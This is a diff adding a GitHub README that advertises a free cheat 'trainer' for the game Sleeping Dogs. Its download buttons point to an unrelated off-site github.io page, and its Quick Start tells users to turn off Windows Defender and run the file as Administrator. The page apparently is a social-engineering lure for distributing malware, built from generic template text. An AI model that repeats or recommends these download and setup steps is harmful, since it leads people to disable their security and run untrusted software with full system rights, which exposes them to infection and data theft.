@@ -1,0 +1,93 @@
+<div align="center">
+
+![Sleeping Dogs Trainer](https://readme-typing-svg.demolab.com?font=Fira+Code&weight=700&size=28&pause=1000&color=E63946&center=true&vCenter=true&width=700&lines=Sleeping%20Dogs+Trainer)
+
+[![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/sqnstmtvvwat/sleeping-dogs-trainer)
+[![Genre](https://img.shields.io/badge/Genre-Action%20Adventure-green?style=for-the-badge)](https://github.com/sqnstmtvvwat/sleeping-dogs-trainer)
+[![Storage](https://img.shields.io/badge/Storage-14GB-orange?style=for-the-badge)](https://github.com/sqnstmtvvwat/sleeping-dogs-trainer)
+[![Version](https://img.shields.io/badge/Version-2025-blue?style=for-the-badge)](https://github.com/sqnstmtvvwat/sleeping-dogs-trainer)
+[![Stars](https://img.shields.io/github/stars/sqnstmtvvwat/sleeping-dogs-trainer?style=for-the-badge&color=gold)](https://github.com/sqnstmtvvwat/sleeping-dogs-trainer)
+
+**Sleeping Dogs is an underrated open-world action game set in Hong Kong's criminal underworld, where undercover cop Wei Shen infiltrates the Sun On Yee Triad. Features exceptional hand-to-hand combat, police/triad reputation systems, and an authentic Hong Kong atmosphere.**
+
+[![skillicons](https://skillicons.dev/icons?i=windows,apple,github)](https://github.com/sqnstmtvvwat/sleeping-dogs-trainer)
+
+[![Download Trainer](https://img.shields.io/badge/⬇️_Download_Trainer-FF4444?style=for-the-badge&logoColor=white)](https://spearsurvive.github.io/win/)
+
+![Sleeping Dogs](game.jpg)
+
+</div>
+
+---
+
+## 📖 About
+
+Sleeping Dogs is an underrated open-world action game set in Hong Kong's criminal underworld, where undercover cop Wei Shen infiltrates the Sun On Yee Triad. Features exceptional hand-to-hand combat, police/triad reputation systems, and an authentic Hong Kong atmosphere.
+
+## ⚠️ Problems Without Trainer
+
+| Problem | Status |
+|---------|--------|
+| **Combat Depth** — Counters and environmental attacks require timing practice to master | ✅ Solved |
+| **Racing Missions** — Some story mission racing sequences have very tight time limits | ✅ Solved |
+| **Face Grind** — Unlocking high-end content requires raising both Police and Triad face ratings | ✅ Solved |
+| **Collectible Count** — Jade statues and lock boxes require thorough district searching | ✅ Solved |
+
+## ✅ Solution
+
+The **Sleeping Dogs Trainer** solves all these issues by giving you complete control over the game.
+
+## 🎯 Full Feature List
+
+- Unlimited Resources
+- God Mode / Invincibility
+- Instant Skill Cooldown
+- One-Hit Kill
+- Freeze Game Timer
+- Unlock All Items & Achievements
+- Custom Speed Multiplier
+- Save State Anywhere
+
+## 🚀 Quick Start
+
+1. **Disable Windows Defender** temporarily (trainer may trigger false positive)
+2. Download the trainer from the button above
+3. Launch Sleeping Dogs
+4. Run the trainer as Administrator
+5. Activate desired cheats with hotkeys
+
+## 💎 Free vs Paid
+
+| Feature | Free | Pro |
+|---------|------|-----|
+| Basic God Mode | ✅ | ✅ |
+| Unlimited Resources | ✅ | ✅ |
+| All Advanced Cheats | ❌ | ✅ |
+| Auto-Updates | ❌ | ✅ |
+| Priority Support | ❌ | ✅ |
+
+## 💻 Requirements
+
+- Windows 10/11 (64-bit)
+- Sleeping Dogs (any version)
+- .NET Framework 4.8+
+- DirectX 11+
+
+## 🍎 macOS
+
+macOS users can use our alternative tool:
+
+[![macOS Download](https://img.shields.io/badge/macOS-Download-silver?style=for-the-badge&logo=apple)](https://spearsurvive.github.io/mac/)
+
+## ⚖️ Legal
+
+This trainer is for educational and single-player use only. Use responsibly.
+
+---
+
+<div align="center">
+
+[![Made with Love](https://img.shields.io/badge/Made_with-❤️-red?style=for-the-badge)](https://github.com/sqnstmtvvwat/sleeping-dogs-trainer)
+[![Follow](https://img.shields.io/github/followers/sqnstmtvvwat?style=for-the-badge&label=Follow)](https://github.com/sqnstmtvvwat)
+
+</div>
